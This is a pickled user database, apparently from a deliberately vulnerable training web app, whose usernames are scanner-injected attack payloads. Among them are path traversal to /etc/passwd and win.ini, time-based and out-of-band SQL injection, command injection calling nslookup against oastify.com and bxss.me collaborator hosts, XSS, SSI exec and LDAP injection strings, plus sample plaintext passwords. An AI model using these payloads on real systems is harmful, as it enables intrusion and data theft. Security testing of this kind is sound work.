(dp1
S'/../../../../../../../../../etc/hosts'
p2
(dp3
S'is_author'
p4
S'True'
p5
sS'name'
p6
g2
sS'pw'
p7
S'1'
ssS'YCgruyjE0W45pz4p'
p8
(dp9
S'is_author'
p10
S'True'
p11
sS'name'
p12
g8
sS'pw'
p13
NssS'/../../../../../../../../../etc/hosts\x00.js'
p14
(dp15
g4
S'True'
p16
sg6
g14
sg7
S'1'
ssS'1\\\'\\"'
p17
(dp18
g4
S'True'
p19
sg6
g17
sg7
S'1'
ssS'c:\\Windows\\system.ini'
p20
(dp21
g10
S'True'
p22
sg12
g20
sg13
NssS'1\\\\\'\\\\"'
p23
(dp24
g4
S'True'
p25
sg6
g23
sg7
S'1'
ssS'http://www.google.com/search?q=OWASP%20ZAP'
p26
(dp27
g10
S'True'
p28
sg12
g26
sg13
NssS"YCgruyjE and exists (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) -- "
p29
(dp30
g10
S'True'
p31
sg12
g29
sg13
NssS'vjYTjpqN\r\nBCC:3bfhvhlnfulwfi2qqy0rz3thv811psfg79v0ir6g@oastify.com\r\nkjt: l'
p32
(dp33
g4
S'True'
p34
sg6
g32
sg7
S'g8S!c8l!X0'
p35
ssS"vjYTjpqN'"
p36
(dp37
g4
S'True'
p38
sg6
g36
sg7
S'g8S!c8l!X0'
p39
ssS'www.google.com:80/'
p40
(dp41
g10
S'True'
p42
sg12
g40
sg13
NssS'vjYTjpqN"'
p43
(dp44
g4
S'True'
p45
sg6
g43
sg7
S'g8S!c8l!X0'
p46
ssS'xfs.bxss.me'
p47
(dp48
g10
S'True'
p49
sg12
g47
sg13
S'u]H[ww6KrA9F.x-F'
p50
ssS'c:\\windows\\win.ini'
p51
(dp52
g4
S'True'
p53
sg6
g51
sg7
S'g8S!c8l!X0'
p54
ssS"eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))"
p55
(dp56
g4
S'True'
p57
sg6
g55
sg7
S'g8S!c8l!X0'
p58
ssS"ghovjnjv'||'"
p59
(dp60
g10
S'True'
p61
sg12
g59
sg13
S'u]H[ww6KrA9F.x-F'
p62
ssS'..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\system.ini'
p63
(dp64
g10
S'True'
p65
sg12
g63
sg13
NssS'ghovjnjv" AND 2*3*8=6*8 AND "OvWd"="OvWd'
p66
(dp67
g10
S'True'
p68
sg12
g66
sg13
S'u]H[ww6KrA9F.x-F'
p69
ssS'../../../../../../../../../../../../../../etc/passwd'
p70
(dp71
g10
S'True'
p72
sg12
g70
sg13
S'u]H[ww6KrA9F.x-F'
p73
ssS'ghovjnjv\'"()&%<zzz><ScRiPt >JmvH(9165)</ScRiPt>'
p74
(dp75
g10
S'True'
p76
sg12
g74
sg13
S'u]H[ww6KrA9F.x-F'
p77
ssS'ghovjnjv"||sleep(27*1000)*etokgd||"'
p78
(dp79
g10
S'True'
p80
sg12
g78
sg13
S'u]H[ww6KrA9F.x-F'
p81
ssS"1'`uname`'"
p82
(dp83
g4
S'True'
p84
sg6
g82
sg7
S'1'
ssS'\\saveprofile'
p85
(dp86
g10
S'True'
p87
sg12
g85
sg13
NssS"vjYTjpqN'.sleep(20).'"
p88
(dp89
g4
S'True'
p90
sg6
g88
sg7
S'g8S!c8l!X0'
p91
ssS'ghovjnjv&n926993=v900338'
p92
(dp93
g10
S'True'
p94
sg12
g92
sg13
S'u]H[ww6KrA9F.x-F'
p95
ssS'&apos;skip&apos;&apos;&apos;&quot;fish&quot;&quot;&quot;'
p96
(dp97
g4
S'True'
p98
sg6
g96
sg7
S'1'
ssS'1\'"\'"\'"\'"'
p99
(dp100
g4
S'True'
p101
sg6
g99
sg7
S'1'
ssS'jst/saveprofile'
p102
(dp103
g4
S'True'
p104
sg6
g102
sg7
S'g8S!c8l!X0'
p105
ssS'<!--#EXEC cmd="ls /"-->'
p106
(dp107
g10
S'True'
p108
sg12
g106
sg13
NssS'|echo yrzunz$()\\ ytffns\\nz^xyu||a #\' |echo yrzunz$()\\ ytffns\\nz^xyu||a #|" |echo yrzunz$()\\ ytffns\\nz^xyu||a #'
p109
(dp110
g10
S'True'
p111
sg12
g109
sg13
S'u]H[ww6KrA9F.x-F'
p112
ssS'./1'
p113
(dp114
g4
S'True'
p115
sg6
g113
sg7
S'1'
ssS'6plmao6z0tw9ef9db53tzs90ab3wkae34s72gp9rh3udxj7mxsoxal7t81l'
p116
(dp117
g10
S'True'
p118
sg12
g116
sg13
NssS'file:///etc/passwd'
p119
(dp120
g10
S'True'
p121
sg12
g119
sg13
S'u]H[ww6KrA9F.x-F'
p122
ssS"'case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p123
(dp124
g10
S'True'
p125
sg12
g123
sg13
NssS';'
(dp126
g10
S'True'
p127
sg12
S';'
sg13
NssS'/WEB-INF/web.xml'
p128
(dp129
g10
S'True'
p130
sg12
g128
sg13
NssS'www.google.com/search?q=OWASP%20ZAP'
p131
(dp132
g10
S'True'
p133
sg12
g131
sg13
NssS'WEB-INF/web.xml'
p134
(dp135
g10
S'True'
p136
sg12
g134
sg13
NssS'jquca3kio5dl73dxw6o2urit1pxygcq94uii8f599c8ecwc7j8wc1p5bt1'
p137
(dp138
g10
S'True'
p139
sg12
g137
sg13
NssS'YCgruyjE / sleep(15) '
p140
(dp141
g10
S'True'
p142
sg12
g140
sg13
NssS"0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z"
p143
(dp144
g10
S'True'
p145
sg12
g143
sg13
S'u]H[ww6KrA9F.x-F'
p146
ssS'ghovjnjv<esi:include src="http://bxss.me/rpb.png"/>'
p147
(dp148
g10
S'True'
p149
sg12
g147
sg13
S'u]H[ww6KrA9F.x-F'
p150
ssS'YCgruyjE" and 0 in (select sleep(15) ) -- '
p151
(dp152
g10
S'True'
p153
sg12
g151
sg13
NssS'^(#$!@#$)(()))******'
p154
(dp155
g10
S'True'
p156
sg12
g154
sg13
S'u]H[ww6KrA9F.x-F'
p157
ssS"URL='http://3578541350414011388.owasp.org'"
p158
(dp159
g10
S'True'
p160
sg12
g158
sg13
NssS"'+response.write(9482720*9918357)+'"
p161
(dp162
g10
S'True'
p163
sg12
g161
sg13
S'u]H[ww6KrA9F.x-F'
p164
ssS"(select load_file('\\\\\\\\s2v6m6cc6jcl67tfhnrgqsk6mxsqgh65x7ly8pwe.oastify.com\\\\nyw'))"
p165
(dp166
g4
S'True'
p167
sg6
g165
sg7
S'g8S!c8l!X0'
p168
ssS'/../../WEB-INF/web.xml'
p169
(dp170
g4
S'True'
p171
sg6
g169
sg7
S'1'
ssS'\r\nSomeCustomInjectedHeader: injected_by_wvs'
p172
(dp173
g10
S'True'
p174
sg12
g172
sg13
S'u]H[ww6KrA9F.x-F'
p175
ssS'mgv0dvngl8\xc1\x81ypcitvqown'
p176
(dp177
g4
S'True'
p178
sg6
g176
sg7
S'g8S!c8l!X0'
p179
ssS'qauy4{{512*453}}ul8mo'
p180
(dp181
g4
S'True'
p182
sg6
g180
sg7
S'g8S!c8l!X0'
p183
ssS"vjYTjpqN waitfor delay'0:0:20'--"
p184
(dp185
g4
S'True'
p186
sg6
g184
sg7
S'g8S!c8l!X0'
p187
ssS"vjYTjpqN;declare @q varchar(99);set @q='\\\\en5s7sxyr5x7rte129c2be5s7jdc13rrih68tzho.oasti'+'fy.com\\ypi'; exec master.dbo.xp_dirtree @q;-- "
p188
(dp189
g4
S'True'
p190
sg6
g188
sg7
S'g8S!c8l!X0'
p191
ssS'file:%2F%2F%2Fetc%2Fhosts'
p192
(dp193
g4
S'True'
p194
sg6
g192
sg7
S'1'
ssS'(select*from(select(sleep(20)))a)'
p195
(dp196
g4
S'True'
p197
sg6
g195
sg7
S'g8S!c8l!X0'
p198
ssS'../ghovjnjv'
p199
(dp200
g10
S'True'
p201
sg12
g199
sg13
S'u]H[ww6KrA9F.x-F'
p202
ssS"vjYTjpqN)waitfor delay'0:0:20'--"
p203
(dp204
g4
S'True'
p205
sg6
g203
sg7
S'g8S!c8l!X0'
p206
ssS'bxss.me/t/xss.html?%00'
p207
(dp208
g10
S'True'
p209
sg12
g207
sg13
S'u]H[ww6KrA9F.x-F'
p210
ssS'vjYTjpqN%}slsao\'/"<mav7z'
p211
(dp212
g4
S'True'
p213
sg6
g211
sg7
S'g8S!c8l!X0'
p214
ssS'www.google.com/'
p215
(dp216
g10
S'True'
p217
sg12
g215
sg13
NssS'1bogus\rSkipfish-Inject:bogus'
p218
(dp219
g4
S'True'
p220
sg6
g218
sg7
S'1'
ssS'vjYTjpqN and (select*from(select(sleep(20)))a)-- '
p221
(dp222
g4
S'True'
p223
sg6
g221
sg7
S'g8S!c8l!X0'
p224
ssS'././saveprofile'
p225
(dp226
g4
S'True'
p227
sg6
g225
sg7
S'g8S!c8l!X0'
p228
ssS"vjYTjpqN54379207' or 8655=8659-- "
p229
(dp230
g4
S'True'
p231
sg6
g229
sg7
S'g8S!c8l!X0'
p232
ssS'vjYTjpqN&ping -n 21 127.0.0.1&'
p233
(dp234
g4
S'True'
p235
sg6
g233
sg7
S'g8S!c8l!X0'
p236
ssS'vjYTjpqN&echo o6w9012aia hwpvnmkjac&'
p237
(dp238
g4
S'True'
p239
sg6
g237
sg7
S'g8S!c8l!X0'
p240
ssS'vjYTjpqN\'"`0&nslookup -q=cname mf50z0p6jdpfj169uh4a3mx0zr5ktbjzgn7ayyn.oastify.com.&`\''
p241
(dp242
g4
S'True'
p243
sg6
g241
sg7
S'g8S!c8l!X0'
p244
ssS"BKkZNvcd') OR 29=(SELECT 29 FROM PG_SLEEP(15))--"
p245
(dp246
g10
S'True'
p247
sg12
g245
sg13
S'u]H[ww6KrA9F.x-F'
p248
ssS'https://3578541350414011388.owasp.org'
p249
(dp250
g10
S'True'
p251
sg12
g249
sg13
NssS"vjYTjpqN'(select*from(select(sleep(20)))a)'"
p252
(dp253
g4
S'True'
p254
sg6
g252
sg7
S'g8S!c8l!X0'
p255
ssS"D9NTO4De'"
p256
(dp257
g10
S'True'
p258
sg12
g256
sg13
S'u]H[ww6KrA9F.x-F'
p259
ssS'JOAlsSMj'
p260
(dp261
g4
S'True'
p262
sg6
g260
sg7
S'g8C!j0l!G4'
p263
ssS"ghovjnjv' AND 2*3*8=6*8 AND 'pZme'='pZme"
p264
(dp265
g10
S'True'
p266
sg12
g264
sg13
S'u]H[ww6KrA9F.x-F'
p267
ssS'; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p268
(dp269
g10
S'True'
p270
sg12
g268
sg13
NssS'/../../WEB-INF/web.xml\x00.js'
p271
(dp272
g4
S'True'
p273
sg6
g271
sg7
S'1'
ssS'<ijc xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://wddaxanghnnphb4jsr2k1wvax13urlh9ix9k08p.oastify.com/foo"/></ijc>'
p274
(dp275
g4
S'True'
p276
sg6
g274
sg7
S'g8S!c8l!X0'
p277
ssS'q3ggiztvft&#65;mw9wmlu6yn'
p278
(dp279
g4
S'True'
p280
sg6
g278
sg7
S'g8S!c8l!X0'
p281
ssS"YCgruyjE' UNION ALL select NULL -- "
p282
(dp283
g10
S'True'
p284
sg12
g282
sg13
NssS'1'
(dp285
g4
S'True'
p286
sg6
S'1'
sg7
S'1'
ssS"vjYTjpqN' and (select*from(select(sleep(20)))a)-- "
p287
(dp288
g4
S'True'
p289
sg6
g287
sg7
S'g8S!c8l!X0'
p290
ssS'YCgruyjE AND 1=1 -- '
p291
(dp292
g10
S'True'
p293
sg12
g291
sg13
NssS'http://www.google.com'
p294
(dp295
g10
S'True'
p296
sg12
g294
sg13
NssS'administrator'
p297
(dp298
S'private_snippet'
p299
S'My password is secret. Get it?'
p300
sS'name'
p301
S'Admin'
p302
sS'web_site'
p303
S'https://www.google.com/contact/'
p304
sS'is_admin'
p305
I01
sS'is_author'
p306
I00
sS'pw'
p307
S'secret'
p308
ssS'..\\..\\..\\..\\..\\..\\..\\..\\boot.ini'
p309
(dp310
g4
S'True'
p311
sg6
g309
sg7
S'1'
ssS'ia0do#{246*418}zclgd'
p312
(dp313
g4
S'True'
p314
sg6
g312
sg7
S'g8S!c8l!X0'
p315
ssS'*)(!(!(!(objectClass=*)))'
p316
(dp317
g4
S'True'
p318
sg6
g316
sg7
S'g8S!c8l!X0'
p319
ssS"vjYTjpqN'+(select*from(select(sleep(20)))a)+'"
p320
(dp321
g4
S'True'
p322
sg6
g320
sg7
S'g8S!c8l!X0'
p323
ssS'/../../../../../../WEB-INF/web.xml'
p324
(dp325
g4
S'True'
p326
sg6
g324
sg7
S'1'
ssS"YCgruyjE / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) "
p327
(dp328
g10
S'True'
p329
sg12
g327
sg13
NssS'vjYTjpqN\'+(function(){if(typeof neu4u==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);neu4u=1;}}())+\''
p330
(dp331
g4
S'True'
p332
sg6
g330
sg7
S'g8S!c8l!X0'
p333
ssS')'
(dp334
g10
S'True'
p335
sg12
S')'
sg13
S'u]H[ww6KrA9F.x-F'
p336
ssS'abmotmWW'
p337
(dp338
g4
S'True'
p339
sg6
g337
sg7
NssS'(select(0)from(select(sleep(15)))v)/*\'+(select(0)from(select(sleep(15)))v)+\'"+(select(0)from(select(sleep(15)))v)+"*/'
p340
(dp341
g10
S'True'
p342
sg12
g340
sg13
S'u]H[ww6KrA9F.x-F'
p343
ssS'vjYTjpqN'
p344
(dp345
g4
S'True'
p346
sg6
g344
sg7
S'g8S!c8l!X0'
p347
ssS'bRxNsIAu..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini'
p348
(dp349
g4
S'True'
p350
sg6
g348
sg7
S'g8S!c8l!X0'
p351
ssS'sfish>\'>"><sfish></sfish>'
p352
(dp353
g4
S'True'
p354
sg6
g352
sg7
S'1'
ssS'../../../../../../../../../../../../../../../../Windows/system.ini'
p355
(dp356
g10
S'True'
p357
sg12
g355
sg13
NssS'1"`false`"'
p358
(dp359
g4
S'True'
p360
sg6
g358
sg7
S'1'
ssS'brie'
p361
(dp362
g299
S'I use the same password for all my accounts.'
p363
sg301
S'Brie'
p364
sS'color'
p365
S'red; text-decoration:underline'
p366
sg303
S'https://news.google.com/news/search?q=brie'
p367
sg305
I00
sg306
I01
sS'snippets'
p368
(lp369
S'Brie is the queen of the cheeses<span style=color:red>!!!</span>'
p370
asg307
S'briebrie'
p371
ssS'1 - 0 - 0'
p372
(dp373
g4
S'True'
p374
sg6
g372
sg7
S'1'
ssS'WEB-INF\\web.xml'
p375
(dp376
g10
S'True'
p377
sg12
g375
sg13
NssS'"+"A".concat(70-3).concat(22*4).concat(112).concat(76).concat(121).concat(90)+(require"socket"\nSocket.gethostbyname("hitrc"+"zytfeijnb06b1.bxss.me.")[3].to_s)+"'
p378
(dp379
g10
S'True'
p380
sg12
g378
sg13
S'u]H[ww6KrA9F.x-F'
p381
ssS'1yrphmgdpgulaszriylqiipemefmacafkxycjaxjs\x00.jpg'
p382
(dp383
g10
S'True'
p384
sg12
g382
sg13
S'u]H[ww6KrA9F.x-F'
p385
ssS'http://3578541350414011388.owasp.org'
p386
(dp387
g10
S'True'
p388
sg12
g386
sg13
NssS"vjYTjpqN'|echo o46hwtov5m v0kovt8tel #xzwx"
p389
(dp390
g4
S'True'
p391
sg6
g389
sg7
S'g8S!c8l!X0'
p392
ssS"vjYTjpqN' and '4713'='4713"
p393
(dp394
g4
S'True'
p395
sg6
g393
sg7
S'g8S!c8l!X0'
p396
ssS"vjYTjpqN);declare @q varchar(99);set @q='\\\\lmbz6zw5qcweq0d81gb9al4z6qcj0aqyhq5hs8gx.oasti'+'fy.com\\clu'; exec master.dbo.xp_dirtree @q;-- "
p397
(dp398
g4
S'True'
p399
sg6
g397
sg7
S'g8S!c8l!X0'
p400
ssS'+/skipfish-bom'
p401
(dp402
g4
S'True'
p403
sg6
g401
sg7
S'1'
ssS'.../1'
p404
(dp405
g4
S'True'
p406
sg6
g404
sg7
S'1'
ssS'\'"\x00<scrIpt>alert(1);</scRipt>'
p407
(dp408
g10
S'True'
p409
sg12
g407
sg13
NssS'\'skip\'\'\'"fish"""'
p410
(dp411
g4
S'True'
p412
sg6
g410
sg7
S'1'
ssS'ghovjnjv"&&sleep(27*1000)*nsdnuh&&"'
p413
(dp414
g10
S'True'
p415
sg12
g413
sg13
S'u]H[ww6KrA9F.x-F'
p416
ssS"case when cast(pg_sleep(15) as varchar) > '' then 0 else 1 end -- "
p417
(dp418
g10
S'True'
p419
sg12
g417
sg13
NssS'vjYTjpqNojpk9k4vnb&#65;y98w4imb64'
p420
(dp421
g4
S'True'
p422
sg6
g420
sg7
S'g8S!c8l!X0'
p423
ssS'http://www.google.com/'
p424
(dp425
g10
S'True'
p426
sg12
g424
sg13
NssS'\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9c\xc0\xae\xc0\xae\xc0\x9cwindows\xc0\x9cwin.ini'
p427
(dp428
g4
S'True'
p429
sg6
g427
sg7
S'g8S!c8l!X0'
p430
ssS'YCgruyjE UNION ALL select NULL -- '
p431
(dp432
g10
S'True'
p433
sg12
g431
sg13
NssS"YCgruyjE' / (SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual) / '"
p434
(dp435
g10
S'True'
p436
sg12
g434
sg13
NssS'*)(!(!(objectClass=*))'
p437
(dp438
g4
S'True'
p439
sg6
g437
sg7
S'g8S!c8l!X0'
p440
ssS'wy8545dp'
p441
(dp442
g10
S'True'
p443
sg12
g441
sg13
S'u]H[ww6KrA9F.x-F'
p444
ssS'c:/'
p445
(dp446
g10
S'True'
p447
sg12
g445
sg13
NssS'YCgruyjE" AND "1"="1'
p448
(dp449
g10
S'True'
p450
sg12
g448
sg13
NssS'1-0-9'
p451
(dp452
g4
S'True'
p453
sg6
g451
sg7
S'1'
ssS"'"
(dp454
g10
S'True'
p455
sg12
S"'"
sg13
S'u]H[ww6KrA9F.x-F'
p456
ssS"vjYTjpqN' and '9706'='9713"
p457
(dp458
g4
S'True'
p459
sg6
g457
sg7
S'g8S!c8l!X0'
p460
ssS'1-0-0'
p461
(dp462
g4
S'True'
p463
sg6
g461
sg7
S'1'
ssS"vjYTjpqN' waitfor delay'0:0:20'--"
p464
(dp465
g4
S'True'
p466
sg6
g464
sg7
S'g8S!c8l!X0'
p467
ssS'.htaccess.aspx-->">\'>\'"<sfi000067v187080>'
p468
(dp469
g4
S'True'
p470
sg6
g468
sg7
S'1'
ssS'/../../../../../../../../../etc/passwd'
p471
(dp472
g4
S'True'
p473
sg6
g471
sg7
S'1'
ssS'hyzur[[597*288]]rypl6'
p474
(dp475
g4
S'True'
p476
sg6
g474
sg7
S'g8S!c8l!X0'
p477
ssS'file:///etc/hosts\x00.js'
p478
(dp479
g4
S'True'
p480
sg6
g478
sg7
S'1'
ssS'https://\\3578541350414011388.owasp.org'
p481
(dp482
g10
S'True'
p483
sg12
g481
sg13
NssS'"+response.write(9482720*9918357)+"'
p484
(dp485
g10
S'True'
p486
sg12
g484
sg13
S'u]H[ww6KrA9F.x-F'
p487
ssS'/./saveprofile'
p488
(dp489
g4
S'True'
p490
sg6
g488
sg7
S'g8S!c8l!X0'
p491
ssS'file:///boot.ini'
p492
(dp493
g4
S'True'
p494
sg6
g492
sg7
S'1'
ssS'c:\\'
p495
(dp496
g10
S'True'
p497
sg12
g495
sg13
NssS'u0v8k8ae4lan49rhfppioui8kzqsej47wzkq7hv6'
p498
(dp499
g4
S'True'
p500
sg6
g498
sg7
S'g8C!j0l!G4'
p501
ssS'vjYTjpqN|ping -c 21 127.0.0.1||x'
p502
(dp503
g4
S'True'
p504
sg6
g502
sg7
S'g8S!c8l!X0'
p505
ssS'\'"<img src=x onerror=prompt()>'
p506
(dp507
g10
S'True'
p508
sg12
g506
sg13
NssS'pfohg6k7ol'
p509
(dp510
g4
S'True'
p511
sg6
g509
sg7
S'g8S!c8l!X0'
p512
ssS'../../../../../../../../../../../../../../../../windows/win.ini'
p513
(dp514
g4
S'True'
p515
sg6
g513
sg7
S'g8S!c8l!X0'
p516
ssS'file:///boot.ini\x00.js'
p517
(dp518
g4
S'True'
p519
sg6
g517
sg7
S'1'
ssS'!(()&&!|*|*|'
p520
(dp521
g10
S'True'
p522
sg12
g520
sg13
S'u]H[ww6KrA9F.x-F'
p523
ssS'www.google.com:80/search?q=OWASP%20ZAP'
p524
(dp525
g10
S'True'
p526
sg12
g524
sg13
NssS'`false`'
p527
(dp528
g4
S'True'
p529
sg6
g527
sg7
S'1'
ssS'&(nslookup hittrlczgwqfrca3fb.bxss.me||perl -e "gethostbyname(\'hittrlczgwqfrca3fb.bxss.me\')")&\'\\"`0&(nslookup hittrlczgwqfrca3fb.bxss.me||perl -e "gethostbyname(\'hittrlczgwqfrca3fb.bxss.me\')")&`\''
p530
(dp531
g10
S'True'
p532
sg12
g530
sg13
S'u]H[ww6KrA9F.x-F'
p533
ssS'/../../../../../../../WEB-INF/web.xml'
p534
(dp535
g4
S'True'
p536
sg6
g534
sg7
S'1'
ssS"(SELECT  UTL_INADDR.get_host_name('10.0.0.1') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.2') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.3') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.4') from dual union SELECT  UTL_INADDR.get_host_name('10.0.0.5') from dual)"
p537
(dp538
g10
S'True'
p539
sg12
g537
sg13
NssS'"'
(dp540
g10
S'True'
p541
sg12
S'"'
sg13
S'u]H[ww6KrA9F.x-F'
p542
ssS'YCgruyjE\n\r\n\r<scrIpt>alert(1);</scRipt>'
p543
(dp544
g10
S'True'
p545
sg12
g543
sg13
NssS"vjYTjpqN,0)waitfor delay'0:0:20'--"
p546
(dp547
g4
S'True'
p548
sg6
g546
sg7
S'g8S!c8l!X0'
p549
ssS"1 waitfor delay '0:0:15' -- "
p550
(dp551
g10
S'True'
p552
sg12
g550
sg13
S'u]H[ww6KrA9F.x-F'
p553
ssS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
p554
(dp555
g4
S'True'
p556
sg6
g554
sg7
S'1'
ssS'\'"><svg/onload=fetch`//u508p8fe9lfn99whkpuitun8pzvsjj971xpocf04\\.oastify.com`>'
p557
(dp558
g4
S'True'
p559
sg6
g557
sg7
S't2O!f7q!O7'
p560
ssS'`true`'
p561
(dp562
g4
S'True'
p563
sg6
g561
sg7
S'1'
ssS"5;URL='https://3578541350414011388.owasp.org'"
p564
(dp565
g10
S'True'
p566
sg12
g564
sg13
NssS'"case when cast(pg_sleep(15) as varchar) > \'\' then 0 else 1 end -- '
p567
(dp568
g10
S'True'
p569
sg12
g567
sg13
NssS'http://www.google.com:80/'
p570
(dp571
g10
S'True'
p572
sg12
g570
sg13
NssS'YCgruyjE AND 1=1'
p573
(dp574
g10
S'True'
p575
sg12
g573
sg13
NssS'case randomblob(100000000) when not null then 1 else 1 end '
p576
(dp577
g10
S'True'
p578
sg12
g576
sg13
NssS'"><!--#EXEC cmd="ls /"--><'
p579
(dp580
g10
S'True'
p581
sg12
g579
sg13
NssS'|(nslookup hitpdcpwxoost55280.bxss.me||perl -e "gethostbyname(\'hitpdcpwxoost55280.bxss.me\')")'
p582
(dp583
g10
S'True'
p584
sg12
g582
sg13
S'u]H[ww6KrA9F.x-F'
p585
ssS'%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts'
p586
(dp587
g4
S'True'
p588
sg6
g586
sg7
S'1'
ssS'./ghovjnjv'
p589
(dp590
g10
S'True'
p591
sg12
g589
sg13
S'u]H[ww6KrA9F.x-F'
p592
ssS'"-->\'-->`--><!--#set var="4c6" value="3b5hvhlnfu"--><!--#set var="6e8" value="5d7jxjnphw"--><!--#echo var="4c6"--><!--#echo var="6e8"--><!--#exec cmd="nslookup -q=cname qys4i48a2h8j25pddlnemqg4ivoocf23u1is5jt8.oastify.com" -->'
p593
(dp594
g4
S'True'
p595
sg6
g593
sg7
S'g8S!c8l!X0'
p596
ssS'bRxNsIAu'
p597
(dp598
g4
S'True'
p599
sg6
g597
sg7
S'a9J!s9v!Y5'
p600
ssS'vjYTjpqN|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\" |ping -n 21 127.0.0.1'
p601
(dp602
g4
S'True'
p603
sg6
g601
sg7
S'g8S!c8l!X0'
p604
ssS'gn7u7ux0r7x9rve32bc4bg5u7lde15rtjha41sq.oastify.com'
p605
(dp606
g4
S'True'
p607
sg6
g605
sg7
S'g8S!c8l!X0'
p608
ssS'/../../../WEB-INF/web.xml'
p609
(dp610
g4
S'True'
p611
sg6
g609
sg7
S'1'
ssS'2je2r7p50t'
p612
(dp613
g4
S'True'
p614
sg6
g612
sg7
S'g8S!c8l!X0'
p615
ssS'"; select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p616
(dp617
g10
S'True'
p618
sg12
g616
sg13
NssS'vjYTjpqN"|ping -n 21 127.0.0.1 ||'
p619
(dp620
g4
S'True'
p621
sg6
g619
sg7
S'g8S!c8l!X0'
p622
ssS'1 PROCEDURE ANALYSE(EXTRACTVALUE(9859,CONCAT(0x5c,(BENCHMARK(110000000,MD5(0x7562756f))))),1)-- '
p623
(dp624
g10
S'True'
p625
sg12
g623
sg13
S'u]H[ww6KrA9F.x-F'
p626
ssS'); select "java.lang.Thread.sleep"(15000) from INFORMATION_SCHEMA.SYSTEM_COLUMNS where TABLE_NAME = \'SYSTEM_COLUMNS\' and COLUMN_NAME = \'TABLE_NAME\' -- '
p627
(dp628
g10
S'True'
p629
sg12
g627
sg13
NssS'9876sfi'
p630
(dp631
g4
S'True'
p632
sg6
g630
sg7
S'1'
ssS'1-->">\'>\'"<sfi000066v187080>'
p633
(dp634
g4
S'True'
p635
sg6
g633
sg7
S'1'
ssS"vjYTjpqN' and 4170=4178-- "
p636
(dp637
g4
S'True'
p638
sg6
g636
sg7
S'g8S!c8l!X0'
p639
ssS'VGs4dnRMSVY='
p640
(dp641
g10
S'True'
p642
sg12
g640
sg13
S'u]H[ww6KrA9F.x-F'
p643
ssS'`(nslookup hitmgmajvldbwc555a.bxss.me||perl -e "gethostbyname(\'hitmgmajvldbwc555a.bxss.me\')")`'
p644
(dp645
g10
S'True'
p646
sg12
g644
sg13
S'u]H[ww6KrA9F.x-F'
p647
ssS'/../../../../../../../../WEB-INF/web.xml\x00.js'
p648
(dp649
g4
S'True'
p650
sg6
g648
sg7
S'1'
ssS"ghovjnjv'||sleep(27*1000)*osqozf||'"
p651
(dp652
g10
S'True'
p653
sg12
g651
sg13
S'u]H[ww6KrA9F.x-F'
p654
ssS'"><!--#EXEC cmd="dir \\"--><'
p655
(dp656
g10
S'True'
p657
sg12
g655
sg13
NssS'\\WEB-INF\\web.xml'
p658
(dp659
g10
S'True'
p660
sg12
g658
sg13
NssS'9uv4rbrdhx\\\\l91m6wk5rx'
p661
(dp662
g4
S'True'
p663
sg6
g661
sg7
S'g8S!c8l!X0'
p664
ssS'../../../../../../../../../../../../../../../../winnt/win.ini'
p665
(dp666
g4
S'True'
p667
sg6
g665
sg7
S'g8S!c8l!X0'
p668
ssS'nslookup -q=cname gn7u7ux0r7x9rve32bc4bg5u7lde15rtkw8nvej3.oastify.com.&'
p669
(dp670
g4
S'True'
p671
sg6
g669
sg7
S'g8S!c8l!X0'
p672
ssS'ex4eppxu97)(!(objectClass=*)'
p673
(dp674
g4
S'True'
p675
sg6
g673
sg7
S'g8S!c8l!X0'
p676
ssS'1\x00\xc0\xa7\xc0\xa2%2527%2522'
p677
(dp678
g10
S'True'
p679
sg12
g677
sg13
S'u]H[ww6KrA9F.x-F'
p680
ssS'...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\...\\.\\windows\\win.ini'
p681
(dp682
g4
S'True'
p683
sg6
g681
sg7
S'g8S!c8l!X0'
p684
ssS'1\'\'\'\'""""'
p685
(dp686
g4
S'True'
p687
sg6
g685
sg7
S'1'
